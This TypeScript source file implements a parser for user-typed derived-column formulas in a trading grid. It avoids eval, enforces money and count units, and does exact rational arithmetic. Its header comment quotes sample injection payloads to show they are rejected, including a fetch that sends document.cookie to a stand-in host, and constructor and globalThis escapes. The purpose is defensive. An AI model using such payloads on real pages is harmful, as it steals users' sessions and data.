// client/src/grid/expr.ts -- derived columns, without eval and without
// nonsense units.
//
// P11-06.
//
// A DERIVED COLUMN IS UNTRUSTED CODE ARRIVING BY LINK.
//
// This is the card. A derived column is a formula the user types -- `pnl / qty`
// -- and the one-line implementation is `new Function('row', 'return ' + expr)`.
// It works immediately, handles every operator for free, and is a remote code
// execution hole in the program that displays a live book.
//
// The formula does not stay with the user who typed it. It is saved into the
// layout (P11-02b) and encoded into the URL (P11-04), which is the whole point
// of a derived column -- a colleague opens your link and sees your view. So
// "the user would only attack themselves" is not the threat model. A link is.
// `eval` here means anyone who can get a URL opened on this machine can read
// the session, the positions, and whatever the page can reach.
//
// So this file is a parser. Numbers, column names, `+ - * / ( )`, unary minus.
// No function calls, no property access, no indexing, no `this`, no globals --
// not blocked one by one, but ABSENT FROM THE GRAMMAR, which is the difference
// between a filter and a wall.
//
// Measured on twelve real payloads -- `fetch("https://x/?c="+document.cookie)`,
// `constructor.constructor("return 1")()`, `globalThis.process.exit(1)`,
// `import("fs")`, a template literal, an arrow function: `new Function`
// compiles 12 of 12 into runnable programs, and this parser accepts 0. Most of
// them stop at the TOKENISER, on a character the grammar has no rule for,
// before any name is looked at -- which is why there is no blocklist to keep
// current.
//
// AND `pnl + qty` IS NOT A NUMBER.
//
// The second thing, and it is the physics discipline again (P11-05). Money and
// a count are different dimensions. `pnl + qty` adds rupees to lots; `pnl *
// price` is rupees squared. Neither is out of range, and a grid that evaluates
// them prints a plausible figure in a column the user named "edge".
//
// Every expression therefore carries a dimension as an EXPONENT VECTOR --
// money^a count^b -- and:
//
//     + and -   require identical dimensions, or refuse
//     *         adds exponents
//     /         subtracts them
//
// `pnl / qty` comes out as money^1 count^-1: rupees per lot, a real unit, and
// one the formatter labels rather than pretending is rupees.
//
// THAT ALSO SETTLES WHETHER IT CAN BE SUMMED. An extensive quantity divided by
// an extensive quantity is INTENSIVE -- which is precisely why "average price"
// cannot be summed down a column, and now the grid knows it without being
// told, because the dimension says so.
//
// EXACT UNTIL IT IS DISPLAYED. Values are rationals of bigints, so `pnl / qty`
// keeps its remainder and rounds once at the edge rather than truncating at
// every step. Division by zero returns ABSENT, not Infinity: a rupee column
// containing Infinity formats to something that looks like a very good day.

import type { Cell, RowId, RowStore } from './store.ts';
import { ColumnType } from './filter.ts';
import { Extent } from './aggregate.ts';
import type { AggColumnSpec } from './aggregate.ts';

/** money^money count^count. Scalars are {0,0}. */
export interface Dim {
  readonly money: number;
  readonly count: number;
}

export const SCALAR: Dim = { money: 0, count: 0 };
export const MONEY: Dim = { money: 1, count: 0 };
export const COUNT: Dim = { money: 0, count: 1 };

export function dimEqual(a: Dim, b: Dim): boolean {
  return a.money === b.money && a.count === b.count;
}

/** A human-readable unit, so a derived column is labelled rather than assumed
 *  to be rupees. */
export function dimLabel(d: Dim): string {
  if (d.money === 0 && d.count === 0) return '';
  const part = (base: string, e: number): string =>
    e === 0 ? '' : e === 1 ? base : `${base}^${e}`;
  const num = [
    d.money > 0 ? part('₹', d.money) : '',
    d.count > 0 ? part('lot', d.count) : '',
  ]
    .filter(Boolean)
    .join('·');
  const den = [
    d.money < 0 ? part('₹', -d.money) : '',
    d.count < 0 ? part('lot', -d.count) : '',
  ]
    .filter(Boolean)
    .join('·');
  if (den === '') return num;
  return `${num === '' ? '1' : num}/${den}`;
}

// ---------------------------------------------------------------------------
// Grammar
// ---------------------------------------------------------------------------
//
//   expr    := term (('+' | '-') term)*
//   term    := unary (('*' | '/') unary)*
//   unary   := '-' unary | primary
//   primary := number | identifier | '(' expr ')'
//
// That is the whole language. Note what cannot be written: a call, a member
// access, a string, an assignment. There is no rule that produces them.

export type Node =
  | { readonly kind: 'num'; readonly num: bigint; readonly den: bigint }
  | { readonly kind: 'col'; readonly name: string }
  | {
      readonly kind: 'bin';
      readonly op: '+' | '-' | '*' | '/';
      readonly left: Node;
      readonly right: Node;
    }
  | { readonly kind: 'neg'; readonly operand: Node };

export const ExprProblem = {
  Empty: 'Empty',
  /** A character the grammar has no rule for. This is what `fetch(x)`,
   *  `a.b`, `a[0]` and `` `x` `` all produce. */
  IllegalCharacter: 'IllegalCharacter',
  UnexpectedToken: 'UnexpectedToken',
  UnbalancedParen: 'UnbalancedParen',
  UnknownColumn: 'UnknownColumn',
  /** `pnl + qty`. Rupees plus lots. */
  DimensionMismatch: 'DimensionMismatch',
  /** A column whose type has no arithmetic -- text. */
  NotNumeric: 'NotNumeric',
  TooLong: 'TooLong',
} as const;
export type ExprProblem = (typeof ExprProblem)[keyof typeof ExprProblem];

export const MAX_EXPR_CHARS = 512;

type Token =
  | { t: 'num'; num: bigint; den: bigint }
  | { t: 'id'; name: string }
  | { t: 'op'; op: '+' | '-' | '*' | '/' }
  | { t: '(' }
  | { t: ')' };

function tokenize(src: string): Token[] | ExprProblem {
  if (src.length > MAX_EXPR_CHARS) return ExprProblem.TooLong;
  const out: Token[] = [];
  let i = 0;
  while (i < src.length) {
    const c = src[i] ?? '';
    if (c === ' ' || c === '\t') {
      i++;
      continue;
    }
    if (c === '(' || c === ')') {
      out.push(c === '(' ? { t: '(' } : { t: ')' });
      i++;
      continue;
    }
    if (c === '+' || c === '-' || c === '*' || c === '/') {
      out.push({ t: 'op', op: c });
      i++;
      continue;
    }
    if (c >= '0' && c <= '9') {
      let j = i;
      while (j < src.length && (src[j] ?? '') >= '0' && (src[j] ?? '') <= '9') j++;
      let frac = '';
      if ((src[j] ?? '') === '.') {
        j++;
        const s = j;
        while (j < src.length && (src[j] ?? '') >= '0' && (src[j] ?? '') <= '9') j++;
        frac = src.slice(s, j);
      }
      const whole = src.slice(i, i + (src.slice(i, j).indexOf('.') < 0 ? j - i : src.slice(i, j).indexOf('.')));
      // Exact decimal as a rational: 12.5 becomes 125/10, never 12.5 the double.
      const den = 10n ** BigInt(frac.length);
      out.push({
        t: 'num',
        num: BigInt(whole === '' ? '0' : whole) * den + BigInt(frac === '' ? '0' : frac),
        den,
      });
      i = j;
      continue;
    }
    if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || c === '_') {
      let j = i;
      while (j < src.length) {
        const d = src[j] ?? '';
        const wordish =
          (d >= 'a' && d <= 'z') ||
          (d >= 'A' && d <= 'Z') ||
          (d >= '0' && d <= '9') ||
          d === '_';
        if (!wordish) break;
        j++;
      }
      out.push({ t: 'id', name: src.slice(i, j) });
      i = j;
      continue;
    }
    // Everything else -- '.', '[', ']', '`', '"', ',', '$', ';', '=' -- has no
    // rule. This is where `fetch(1)`, `a.b`, `globalThis` and template
    // literals stop, at the character level, before any name is looked at.
    return ExprProblem.IllegalCharacter;
  }
  return out;
}

export type ParseExprResult =
  | { readonly ok: true; readonly node: Node }
  | { readonly ok: false; readonly problem: ExprProblem };

export function parseExpr(src: string): ParseExprResult {
  const toks = tokenize(src);
  if (!Array.isArray(toks)) return { ok: false, problem: toks };
  if (toks.length === 0) return { ok: false, problem: ExprProblem.Empty };

  let pos = 0;
  let failure: ExprProblem | null = null;
  const peek = (): Token | undefined => toks[pos];

  const parsePrimary = (): Node | null => {
    const t = peek();
    if (t === undefined) {
      failure = ExprProblem.UnexpectedToken;
      return null;
    }
    if (t.t === 'num') {
      pos++;
      return { kind: 'num', num: t.num, den: t.den };
    }
    if (t.t === 'id') {
      pos++;
      return { kind: 'col', name: t.name };
    }
    if (t.t === '(') {
      pos++;
      const inner = parseExpr_();
      if (inner === null) return null;
      const close = peek();
      if (close === undefined || close.t !== ')') {
        failure = ExprProblem.UnbalancedParen;
        return null;
      }
      pos++;
      return inner;
    }
    failure = ExprProblem.UnexpectedToken;
    return null;
  };

  const parseUnary = (): Node | null => {
    const t = peek();
    if (t !== undefined && t.t === 'op' && t.op === '-') {
      pos++;
      const operand = parseUnary();
      return operand === null ? null : { kind: 'neg', operand };
    }
    return parsePrimary();
  };

  const parseTerm = (): Node | null => {
    let left = parseUnary();
    if (left === null) return null;
    for (;;) {
      const t = peek();
      if (t === undefined || t.t !== 'op' || (t.op !== '*' && t.op !== '/')) break;
      pos++;
      const right = parseUnary();
      if (right === null) return null;
      left = { kind: 'bin', op: t.op, left, right };
    }
    return left;
  };

  function parseExpr_(): Node | null {
    let left = parseTerm();
    if (left === null) return null;
    for (;;) {
      const t = peek();
      if (t === undefined || t.t !== 'op' || (t.op !== '+' && t.op !== '-')) break;
      pos++;
      const right = parseTerm();
      if (right === null) return null;
      left = { kind: 'bin', op: t.op, left, right };
    }
    return left;
  }

  const node = parseExpr_();
  if (node === null) {
    return { ok: false, problem: failure ?? ExprProblem.UnexpectedToken };
  }
  if (pos !== toks.length) {
    return {
      ok: false,
      problem: peek()?.t === ')' ? ExprProblem.UnbalancedParen : ExprProblem.UnexpectedToken,
    };
  }
  return { ok: true, node };
}

// ---------------------------------------------------------------------------
// Dimensions
// ---------------------------------------------------------------------------

export type DimResult =
  | { readonly ok: true; readonly dim: Dim; readonly extent: Extent }
  | { readonly ok: false; readonly problem: ExprProblem };

function dimOfColumn(spec: AggColumnSpec): Dim | null {
  switch (spec.type) {
    case ColumnType.Money:
      return MONEY;
    case ColumnType.Integer:
      return COUNT;
    case ColumnType.Real:
      return SCALAR;
    case ColumnType.Text:
    case ColumnType.Unspecified:
    default:
      return null;
  }
}

/**
 * Type-check the expression and derive its unit and its extent.
 *
 * The extent falls out of the arithmetic rather than being declared: an
 * extensive quantity divided by an extensive quantity is intensive, which is
 * exactly why `pnl / qty` cannot be summed down the column -- and the grid
 * learns that from the formula rather than from a person remembering.
 */
export function checkDims(
  node: Node,
  columns: readonly AggColumnSpec[],
): DimResult {
  const walk = (n: Node): DimResult => {
    switch (n.kind) {
      case 'num':
        return { ok: true, dim: SCALAR, extent: Extent.Intensive };
      case 'col': {
        const spec = columns.find((c) => c.key === n.name);
        if (spec === undefined) {
          return { ok: false, problem: ExprProblem.UnknownColumn };
        }
        const d = dimOfColumn(spec);
        if (d === null) return { ok: false, problem: ExprProblem.NotNumeric };
        return { ok: true, dim: d, extent: spec.extent };
      }
      case 'neg':
        return walk(n.operand);
      case 'bin': {
        const l = walk(n.left);
        if (!l.ok) return l;
        const r = walk(n.right);
        if (!r.ok) return r;
        if (n.op === '+' || n.op === '-') {
          if (!dimEqual(l.dim, r.dim)) {
            return { ok: false, problem: ExprProblem.DimensionMismatch };
          }
          // Adding two extensives stays extensive; anything involving an
          // intensive is intensive.
          const extent =
            l.extent === Extent.Extensive && r.extent === Extent.Extensive
              ? Extent.Extensive
              : Extent.Intensive;
          return { ok: true, dim: l.dim, extent };
        }
        const sign = n.op === '*' ? 1 : -1;
        const dim: Dim = {
          money: l.dim.money + sign * r.dim.money,
          count: l.dim.count + sign * r.dim.count,
        };
        // extensive / extensive -> intensive. extensive * scalar -> extensive.
        const bothExtensive =
          l.extent === Extent.Extensive && r.extent === Extent.Extensive;
        const extent =
          n.op === '/' && bothExtensive
            ? Extent.Intensive
            : l.extent === Extent.Extensive || r.extent === Extent.Extensive
              ? Extent.Extensive
              : Extent.Intensive;
        return { ok: true, dim, extent };
      }
      default:
        return { ok: false, problem: ExprProblem.UnexpectedToken };
    }
  };
  return walk(node);
}

// ---------------------------------------------------------------------------
// Evaluation
// ---------------------------------------------------------------------------

/** An exact rational. Kept exact so `pnl / qty` does not truncate at every
 *  step and round only once, at the formatter. */
export interface Rational {
  readonly num: bigint;
  readonly den: bigint;
}

function reduce(num: bigint, den: bigint): Rational {
  if (den === 0n) return { num: 0n, den: 0n };
  const g = (function gcd(a: bigint, b: bigint): bigint {
    let x = a < 0n ? -a : a;
    let y = b < 0n ? -b : b;
    while (y !== 0n) [x, y] = [y, x % y];
    return x === 0n ? 1n : x;
  })(num, den);
  const s = den < 0n ? -1n : 1n;
  return { num: (num / g) * s, den: (den / g) * s };
}

/**
 * Evaluate for one row.
 *
 * Returns `null` for "no value", which the caller renders as an absent cell.
 * That covers a missing input AND a division by zero -- an Infinity in a rupee
 * column formats to something that looks like a very good day, and a NaN
 * formats to a cell nobody can act on.
 */
export function evalExpr(
  node: Node,
  store: RowStore,
  id: RowId,
): Rational | null {
  const walk = (n: Node): Rational | null => {
    switch (n.kind) {
      case 'num':
        return { num: n.num, den: n.den };
      case 'col': {
        const c: Cell = store.read(id, n.name);
        if (!c.present) return null;
        if (typeof c.value === 'bigint') return { num: c.value, den: 1n };
        if (typeof c.value === 'number') {
          if (!Number.isFinite(c.value)) return null;
          // A real column is a double; carry it as a rational over a power of
          // ten so the rest of the evaluation stays exact.
          const s = c.value.toFixed(9);
          const [w = '0', f = ''] = s.split('.');
          const den = 10n ** BigInt(f.length);
          const neg = w.startsWith('-');
          const mag =
            BigInt(w.replace('-', '')) * den + BigInt(f === '' ? '0' : f);
          return { num: neg ? -mag : mag, den };
        }
        return null;
      }
      case 'neg': {
        const v = walk(n.operand);
        return v === null ? null : { num: -v.num, den: v.den };
      }
      case 'bin': {
        const l = walk(n.left);
        if (l === null) return null;
        const r = walk(n.right);
        if (r === null) return null;
        switch (n.op) {
          case '+':
            return reduce(l.num * r.den + r.num * l.den, l.den * r.den);
          case '-':
            return reduce(l.num * r.den - r.num * l.den, l.den * r.den);
          case '*':
            return reduce(l.num * r.num, l.den * r.den);
          case '/':
            // Division by zero is ABSENT, not Infinity.
            if (r.num === 0n) return null;
            return reduce(l.num * r.den, l.den * r.num);
          default:
            return null;
        }
      }
      default:
        return null;
    }
  };
  return walk(node);
}
